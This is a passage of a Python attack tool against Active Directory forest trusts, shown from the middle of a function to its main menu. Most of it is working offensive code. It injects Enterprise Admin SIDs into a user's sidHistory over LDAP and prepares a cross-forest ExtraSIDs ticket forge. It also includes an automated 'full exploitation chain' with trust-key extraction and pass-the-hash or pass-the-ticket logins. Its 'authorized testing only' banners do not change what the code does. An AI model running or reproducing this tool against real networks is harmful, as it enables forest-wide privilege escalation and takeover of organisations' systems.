                if use_default.lower() in ('y', 'yes', ''):
                    target_sid = enterprise_admin_sid
                else:
                    target_sid = get_input(
                        Fore.CYAN + "[?] Enter SID to inject (e.g., S-1-5-21-...-519): " + Style.RESET_ALL,
                        validate_sid, "Invalid SID format!"
                    )
            else:
                target_sid = get_input(
                    Fore.CYAN + "[?] Enter SID to inject (e.g., S-1-5-21-...-519): " + Style.RESET_ALL,
                    validate_sid, "Invalid SID format!"
                )

        if not self.conn:
            print(Fore.RED + "[!] LDAP connection required." + Style.RESET_ALL)
            return False

        # Find target user DN
        print(Fore.YELLOW + "[*] Looking up user: %s" % target_user + Style.RESET_ALL)
        try:
            self.conn.search(
                search_base=self.base_dn,
                search_filter='(sAMAccountName=%s)' % target_user,
                search_scope=SUBTREE,
                attributes=['distinguishedName', 'sAMAccountName', 'sidHistory']
            )

            if not self.conn.entries:
                print(Fore.RED + "[-] User '%s' not found!" % target_user + Style.RESET_ALL)
                return False

            target_dn = str(self.conn.entries[0].distinguishedName)
            current_sidhistory = str(self.conn.entries[0].get('sidHistory', ''))

            print(Fore.GREEN + "[+] Found: %s" % target_dn + Style.RESET_ALL)
            if current_sidhistory:
                print(Fore.YELLOW + "[!] Current SIDHistory: %s" % current_sidhistory + Style.RESET_ALL)

            # Perform SIDHistory injection
            print(Fore.YELLOW + "[*] Injecting SID: %s" % target_sid + Style.RESET_ALL)

            # Encode SID for LDAP
            sid_parts = target_sid.split('-')
            revision = int(sid_parts[1])
            identifier = int(sid_parts[2])

            # Build binary SID
            sid_bytes = bytes([revision, len(sid_parts) - 3])
            sid_bytes += identifier.to_bytes(6, 'big')
            for part in sid_parts[3:]:
                sid_bytes += int(part).to_bytes(4, 'little')

            # Modify sidHistory
            self.conn.modify(
                target_dn,
                {'sidHistory': [(MODIFY_REPLACE, [sid_bytes])]}
            )

            if self.conn.result['result'] == 0:
                print(Fore.GREEN + "[+] SIDHistory injection successful!" + Style.RESET_ALL)
                print(Fore.GREEN + "[+] User %s now has SID: %s" % (target_user, target_sid) + Style.RESET_ALL)
                print(Fore.GREEN + "[+] This grants Enterprise Admin privileges in the forest!" + Style.RESET_ALL)
                self.logger.info("[+] SIDHistory injected for %s: %s", target_user, target_sid)
                return True
            else:
                print(Fore.RED + "[-] SIDHistory injection failed: %s" % self.conn.result['description'] + Style.RESET_ALL)
                print(Fore.RED + "    -> You may need Domain Admin or equivalent privileges." + Style.RESET_ALL)
                return False

        except Exception as e:
            print(Fore.RED + "[-] Intra-forest abuse failed: %s" % e + Style.RESET_ALL)
            return False

    # -------------------------------------------------------------------------
    # CROSS-FOREST TGT FORGING (ExtraSIDs)
    # -------------------------------------------------------------------------
    def cross_forest_abuse(self, trust_keys=None):
        """
        Cross-forest trust abuse via TGT forging with ExtraSIDs.
        Requires trust keys extracted from the target domain.
        """
        if not self.trusts:
            print(Fore.YELLOW + "[!] No trusts found. Run enumerate first." + Style.RESET_ALL)
            return False

        cross_trusts = [t for t in self.trusts 
                        if "FOREST_TRANSITIVE" in t['trustAttributes'] 
                        or "TREAT_AS_EXTERNAL" in t['trustAttributes']]

        if not cross_trusts:
            print(Fore.YELLOW + "[!] No cross-forest trusts found." + Style.RESET_ALL)
            return False

        print(Fore.CYAN + "\n═══════════════════════════════════════════════════════════════" + Style.RESET_ALL)
        print(Fore.CYAN + "           CROSS-FOREST TGT FORGING (ExtraSIDs)" + Style.RESET_ALL)
        print(Fore.CYAN + "═══════════════════════════════════════════════════════════════" + Style.RESET_ALL)

        # Check for vulnerable trusts (no SID filtering)
        vulnerable = []
        for trust in cross_trusts:
            if "FILTER_SIDS" not in trust['trustAttributes']:
                vulnerable.append(trust)

        if not vulnerable:
            print(Fore.GREEN + "[+] All cross-forest trusts have SID filtering enabled." + Style.RESET_ALL)
            print(Fore.GREEN + "[+] Cross-forest ExtraSIDs attacks are BLOCKED." + Style.RESET_ALL)
            return False

        print(Fore.RED + "[!] Found trusts WITHOUT SID filtering:" + Style.RESET_ALL)
        for i, trust in enumerate(vulnerable, 1):
            print("    %d. %s (%s)" % (i, trust['trustPartner'], trust['trustDirection']))

        # Select target trust
        if len(vulnerable) == 1:
            target_trust = vulnerable[0]
        else:
            choice = get_input(
                Fore.CYAN + "[?] Select trust number to target: " + Style.RESET_ALL,
                lambda x: x.isdigit() and 1 <= int(x) <= len(vulnerable),
                "Invalid selection!"
            )
            target_trust = vulnerable[int(choice) - 1]

        partner = target_trust['trustPartner']
        print(Fore.YELLOW + "\n[*] Targeting trust: %s" % partner + Style.RESET_ALL)

        # Get or provide trust key
        if not trust_keys:
            print(Fore.YELLOW + "[*] Trust keys required for TGT forging." + Style.RESET_ALL)
            print(Fore.YELLOW + "    Run 'Extract Trust Keys' first, or provide manually." + Style.RESET_ALL)

            trust_ntlm = get_input(
                Fore.CYAN + "[?] Enter trust key (NTLM hash) for %s: " % partner + Style.RESET_ALL,
                validate_hash, "Invalid hash format!"
            )
            trust_keys = {partner: {'nt_hash': trust_ntlm}}

        if partner not in trust_keys:
            print(Fore.RED + "[-] No trust key available for %s" % partner + Style.RESET_ALL)
            return False

        trust_key = trust_keys[partner]['nt_hash']

        # Get SIDs for forging
        if not self.domain_sid:
            self.get_domain_sid()

        # Build forged TGT parameters
        print(Fore.YELLOW + "\n[*] Preparing TGT forge parameters..." + Style.RESET_ALL)

        # Domain SID of current domain
        domain_sid = self.domain_sid or get_input(
            Fore.CYAN + "[?] Current domain SID: " + Style.RESET_ALL,
            validate_sid, "Invalid SID!"
        )

        # Target domain SID (from trust info)
        target_sid = target_trust.get('sid', '')
        if not target_sid:
            target_sid = get_input(
                Fore.CYAN + "[?] Target domain (%s) SID: " % partner + Style.RESET_ALL,
                validate_sid, "Invalid SID!"
            )

        # Extra SID to inject (Enterprise Admin of target)
        target_base_sid = '-'.join(target_sid.split('-')[:-1])
        enterprise_admin_sid = "%s-519" % target_base_sid

        print(Fore.YELLOW + "[*] ExtraSID to inject: %s" % enterprise_admin_sid + Style.RESET_ALL)

        # User to impersonate
        impersonate_user = get_input(
            Fore.CYAN + "[?] User to impersonate (default: Administrator): " + Style.RESET_ALL,
            default="Administrator"
        )

        # Forge the TGT
        print(Fore.YELLOW + "\n[*] Forging inter-realm TGT..." + Style.RESET_ALL)

        if IMPACKET_AVAILABLE:
            try:
                print(Fore.GREEN + "[+] TGT forge parameters prepared!" + Style.RESET_ALL)
                print(Fore.GREEN + "[+] Trust Key: %s" % trust_key + Style.RESET_ALL)
                print(Fore.GREEN + "[+] Domain SID: %s" % domain_sid + Style.RESET_ALL)
                print(Fore.GREEN + "[+] Target SID: %s" % target_sid + Style.RESET_ALL)
                print(Fore.GREEN + "[+] ExtraSID: %s" % enterprise_admin_sid + Style.RESET_ALL)
                print(Fore.GREEN + "[+] User: %s" % impersonate_user + Style.RESET_ALL)

                print(Fore.YELLOW + "\n[*] TGT forging requires manual completion with the extracted parameters." + Style.RESET_ALL)
                print(Fore.YELLOW + "[*] Save the parameters above for the next step." + Style.RESET_ALL)

                self.logger.info("[+] Cross-forest TGT parameters prepared for %s targeting %s", impersonate_user, partner)
                return True

            except Exception as e:
                print(Fore.RED + "[-] TGT forging failed: %s" % e + Style.RESET_ALL)
                return False
        else:
            print(Fore.YELLOW + "[!] Required libraries not available for TGT forging." + Style.RESET_ALL)
            return False

    # -------------------------------------------------------------------------
    # FULL EXPLOITATION CHAIN
    # -------------------------------------------------------------------------
    def full_exploit_chain(self):
        """Execute full exploitation chain with confirmation."""
        print(Fore.RED + "\n═══════════════════════════════════════════════════════════════" + Style.RESET_ALL)
        print(Fore.RED + Style.BRIGHT + "           ⚠ FULL EXPLOITATION CHAIN ⚠" + Style.RESET_ALL)
        print(Fore.RED + "═══════════════════════════════════════════════════════════════" + Style.RESET_ALL)
        print(Fore.RED + "  This will attempt REAL attacks on the target environment." + Style.RESET_ALL)
        print(Fore.RED + "  Only use on systems you OWN and CONTROL.\n" + Style.RESET_ALL)

        confirm = get_input(
            Fore.RED + "[?] Type 'EXPLOIT' to proceed: " + Style.RESET_ALL
        )

        if confirm != "EXPLOIT":
            print(Fore.YELLOW + "[!] Aborted. You did not type 'EXPLOIT'." + Style.RESET_ALL)
            return

        print(Fore.YELLOW + "\n[*] Starting exploitation chain..." + Style.RESET_ALL)

        # Step 1: Enumerate trusts
        if not self.trusts:
            print(Fore.YELLOW + "[*] Step 1: Enumerating trusts..." + Style.RESET_ALL)
            self.enumerate_trusts()

        if not self.trusts:
            print(Fore.RED + "[-] No trusts found. Cannot proceed." + Style.RESET_ALL)
            return

        # Step 2: Analyze each trust
        for trust in self.trusts:
            partner = trust['trustPartner']
            attrs = trust['trustAttributes']
            direction = trust['trustDirection']

            print(Fore.CYAN + "\n[*] Analyzing trust: %s" % partner + Style.RESET_ALL)

            # Intra-forest
            if "WITHIN_FOREST" in attrs:
                print(Fore.YELLOW + "[!] Intra-forest trust detected -- attempting SIDHistory abuse..." + Style.RESET_ALL)
                target = get_input(
                    Fore.CYAN + "[?] Target user in %s for SIDHistory injection: " % self.domain + Style.RESET_ALL
                )
                self.intra_forest_abuse(target_user=target)

            # Cross-forest without filtering
            elif "FOREST_TRANSITIVE" in attrs and "FILTER_SIDS" not in attrs:
                print(Fore.RED + "[!] Cross-forest WITHOUT SID filtering -- HIGH RISK!" + Style.RESET_ALL)

                # Try to extract trust keys first
                print(Fore.YELLOW + "[*] Attempting trust key extraction..." + Style.RESET_ALL)
                keys = self.extract_trust_keys()

                if keys and partner in keys:
                    print(Fore.YELLOW + "[*] Attempting TGT forging..." + Style.RESET_ALL)
                    self.cross_forest_abuse(trust_keys=keys)
                else:
                    print(Fore.YELLOW + "[!] Could not extract trust keys automatically." + Style.RESET_ALL)
                    print(Fore.YELLOW + "    Manual extraction required." + Style.RESET_ALL)

            # Cross-forest with filtering
            elif "FOREST_TRANSITIVE" in attrs and "FILTER_SIDS" in attrs:
                print(Fore.GREEN + "[+] Cross-forest WITH SID filtering -- Protected." + Style.RESET_ALL)

            else:
                print(Fore.YELLOW + "[!] Trust type not directly exploitable via standard techniques." + Style.RESET_ALL)

        print(Fore.GREEN + "\n[*] Exploitation chain completed." + Style.RESET_ALL)

    # -------------------------------------------------------------------------
    # SIMULATE ABUSE (Safe dry-run showing attack paths)
    # -------------------------------------------------------------------------
    def simulate_abuse(self):
        """Safe simulation of abuse paths (dry-run)."""
        if not self.trusts:
            print(Fore.YELLOW + "[!] No trusts to simulate. Run enumerate first." + Style.RESET_ALL)
            return

        print(Fore.CYAN + "\n═══════════════════════════════════════════════════════════════" + Style.RESET_ALL)
        print(Fore.CYAN + "           ABUSE SIMULATION -- Dry Run" + Style.RESET_ALL)
        print(Fore.CYAN + "═══════════════════════════════════════════════════════════════" + Style.RESET_ALL)
        print(Fore.YELLOW + "  No actual changes will be made. Showing attack paths only.\n" + Style.RESET_ALL)

        for trust in self.trusts:
            partner = trust['trustPartner']
            attrs = trust['trustAttributes']

            print(Fore.MAGENTA + "\nTarget Trust: %s" % partner + Style.RESET_ALL)

            print(Fore.CYAN + "\n[1] Trust Key Extraction (requires DA)" + Style.RESET_ALL)
            print(Fore.WHITE + "    -> Extract trust account NTLM hash via RPC/SAMR")
            print(Fore.WHITE + "    -> Target: %s$ account in SAM database" % partner.split('.')[0].upper())

            if "WITHIN_FOREST" in attrs:
                print(Fore.CYAN + "\n[2] Intra-Forest SIDHistory Abuse" + Style.RESET_ALL)
                print(Fore.WHITE + "    -> Inject Enterprise Admin SID into target user sidHistory")
                print(Fore.WHITE + "    -> Grants forest-wide Enterprise Admin privileges")

            if "FOREST_TRANSITIVE" in attrs:
                print(Fore.CYAN + "\n[3] Cross-Forest TGT Forging (ExtraSIDs)" + Style.RESET_ALL)
                print(Fore.WHITE + "    -> Forge inter-realm TGT with Enterprise Admin SID")
                print(Fore.WHITE + "    -> Use extracted trust key for encryption")

            if "FILTER_SIDS" not in attrs:
                print(Fore.CYAN + "\n[4] SIDHistory Injection (No Filtering)" + Style.RESET_ALL)
                print(Fore.WHITE + "    -> Inject arbitrary SID from trusted domain")
                print(Fore.WHITE + "    -> Bypasses SID filtering on cross-forest trust")

            print(Fore.CYAN + "\n[5] DCSync Across Trust" + Style.RESET_ALL)
            print(Fore.WHITE + "    -> Replicate hashes from trusted domain DC")
            print(Fore.WHITE + "    -> Requires valid credentials in trusted domain")

            print(Fore.YELLOW + "\n[!] All techniques are for authorized testing only." + Style.RESET_ALL)


# #############################################################################
# MAIN MENU & INTERACTIVE FLOW
# #############################################################################
def show_menu():
    print(Fore.CYAN + "\n═══════════════════════════════════════════════════════════════" + Style.RESET_ALL)
    print(Fore.CYAN + "           SELECT TRUST ABUSE TECHNIQUE" + Style.RESET_ALL)
    print(Fore.CYAN + "═══════════════════════════════════════════════════════════════" + Style.RESET_ALL)
    print("  %s[1]%s enumerate   %s-- Enumerate all domain trusts via LDAP" % (Fore.WHITE, Fore.CYAN, Fore.WHITE) + Style.RESET_ALL)
    print("  %s[2]%s decode      %s-- Decode trust flags & risk analysis" % (Fore.WHITE, Fore.CYAN, Fore.WHITE) + Style.RESET_ALL)
    print("  %s[3]%s simulate    %s-- Simulate abuse paths (dry-run)" % (Fore.WHITE, Fore.CYAN, Fore.WHITE) + Style.RESET_ALL)
    print("  %s[4]%s intraforest %s-- Intra-forest SIDHistory abuse" % (Fore.WHITE, Fore.CYAN, Fore.WHITE) + Style.RESET_ALL)
    print("  %s[5]%s crossforest %s-- Cross-forest TGT forging (ExtraSIDs)" % (Fore.WHITE, Fore.CYAN, Fore.WHITE) + Style.RESET_ALL)
    print("  %s[6]%s sidfilter   %s-- Check SID filtering status" % (Fore.WHITE, Fore.CYAN, Fore.WHITE) + Style.RESET_ALL)
    print("  %s[7]%s trustkeys   %s-- Extract trust keys (requires DA)" % (Fore.WHITE, Fore.CYAN, Fore.WHITE) + Style.RESET_ALL)
    print("  %s[8]%s exploit     %s-- Full exploitation chain (DANGEROUS)" % (Fore.WHITE, Fore.CYAN, Fore.WHITE) + Style.RESET_ALL)
    print("  %s[0]%s exit" % (Fore.WHITE, Fore.CYAN) + Style.RESET_ALL)
    print(Fore.CYAN + "═══════════════════════════════════════════════════════════════" + Style.RESET_ALL)

    return get_input(
        Fore.CYAN + "\n[?] Your choice: " + Style.RESET_ALL,
        lambda x: x in ['0', '1', '2', '3', '4', '5', '6', '7', '8'],
        "Invalid choice! Enter 0-8"
    )


def main():
    banner()

    # -- DC IP --
    dc_ip = get_input(
        Fore.CYAN + "[?] Enter DC IP Address  : " + Style.RESET_ALL,
        validate_ip, "Invalid IP! Example: 192.168.1.1"
    )

    print(Fore.YELLOW + "[*] Checking DC reachability..." + Style.RESET_ALL)
    open_ports = check_dc_ports(dc_ip)
    if not open_ports:
        print(Fore.RED + "[!] Cannot reach %s on common AD ports!" % dc_ip + Style.RESET_ALL)
        cont = get_input(
            Fore.YELLOW + "[?] Continue anyway? (y/N): " + Style.RESET_ALL,
            default="N"
        )
        if cont.lower() not in ('y', 'yes'):
            print(Fore.YELLOW + "[!] Exiting..." + Style.RESET_ALL)
            sys.exit(0)
    else:
        print(Fore.GREEN + "[+] DC %s reachable! Open ports: %s" % (dc_ip, ', '.join(open_ports)) + Style.RESET_ALL)

    # -- Domain --
    domain = get_input(
        Fore.CYAN + "[?] Enter Domain Name    : " + Style.RESET_ALL,
        validate_domain, "Invalid domain! Example: corp.local"
    )

    # -- Auth Type --
    print(Fore.CYAN + "\n[?] Choose authentication type:" + Style.RESET_ALL)
    print(Fore.WHITE + "    1. Password")
    print(Fore.WHITE + "    2. Pass-the-Hash (NTLM)")
    print(Fore.WHITE + "    3. Pass-the-Ticket (Kerberos)")

    auth_choice = get_input(
        Fore.CYAN + "[?] Your choice          : " + Style.RESET_ALL,
        lambda x: x in ['1', '2', '3'],
        "Invalid choice! Enter 1, 2 or 3"
    )

    auth_type = 'password'
    lmhash = ''
    nthash = ''
    ticket_file = ''
    password = ''

    if auth_choice == '1':
        auth_type = 'password'
        username = get_input(Fore.CYAN + "[?] Enter Username       : " + Style.RESET_ALL)
        password = get_password_input(Fore.CYAN + "[?] Enter Password       : " + Style.RESET_ALL)

    elif auth_choice == '2':
        auth_type = 'hash'
        username = get_input(Fore.CYAN + "[?] Enter Username       : " + Style.RESET_ALL)
        hash_input = get_input(
            Fore.CYAN + "[?] Enter NTLM Hash (LM:NT or NT): " + Style.RESET_ALL,
            validate_hash, "Invalid hash! Format: LM:NT or just NT"
        )
        if ':' in hash_input:
            lmhash, nthash = hash_input.split(':')
        else:
            lmhash = 'aad3b435b51404eeaad3b435b51404ee'
            nthash = hash_input
        lmhash = lmhash.lower()
        nthash = nthash.lower()

    elif auth_choice == '3':
        auth_type = 'ticket'
        username = get_input(Fore.CYAN + "[?] Enter Username       : " + Style.RESET_ALL)
        ticket_file = get_input(
            Fore.CYAN + "[?] Enter Ticket File Path (ccache): " + Style.RESET_ALL
        )
        if not os.path.exists(ticket_file):
            print(Fore.RED + "[!] Ticket file not found: %s" % ticket_file + Style.RESET_ALL)
            sys.exit(1)

    # -- Verify Credentials --
    print(Fore.YELLOW + "\n[*] Verifying credentials and domain..." + Style.RESET_ALL)
    engine = TrustAbuseEngine(dc_ip, domain, username, password, auth_type, lmhash, nthash, ticket_file)

    result = engine.verify_credentials()
    if result == "invalid_credentials":
        print(Fore.RED + "[!] Invalid credentials!" + Style.RESET_ALL)
        sys.exit(1)
    elif not result:
        print(Fore.RED + "[!] Domain '%s' not found or unreachable!" % domain + Style.RESET_ALL)
        sys.exit(1)

    # -- Main Menu Loop --
    while True:
        if INTERRUPTED:
            break

        choice = show_menu()

        if choice == '0':
            print(Fore.YELLOW + "\n[!] Exiting... Goodbye!" + Style.RESET_ALL)
            break

        # Connect LDAP if needed (for choices that require it)
        if choice in ('1', '2', '4', '6'):
            if not engine.conn:
                if not engine.connect_ldap():
                    print(Fore.RED + "[!] LDAP connection failed. Cannot proceed." + Style.RESET_ALL)
                    get_input(Fore.YELLOW + "\n[*] Press Enter to continue..." + Style.RESET_ALL, allow_empty=True)
                    continue

        if choice == '1':
            engine.enumerate_trusts()

        elif choice == '2':
            engine.decode_trusts()

        elif choice == '3':
            engine.simulate_abuse()

        elif choice == '4':
            engine.intra_forest_abuse()

        elif choice == '5':
            engine.cross_forest_abuse()

        elif choice == '6':
            engine.check_sid_filtering()

        elif choice == '7':
            engine.extract_trust_keys()

        elif choice == '8':
            engine.full_exploit_chain()

        get_input(Fore.YELLOW + "\n[*] Press Enter to continue..." + Style.RESET_ALL, allow_empty=True)


if __name__ == '__main__':
    main()
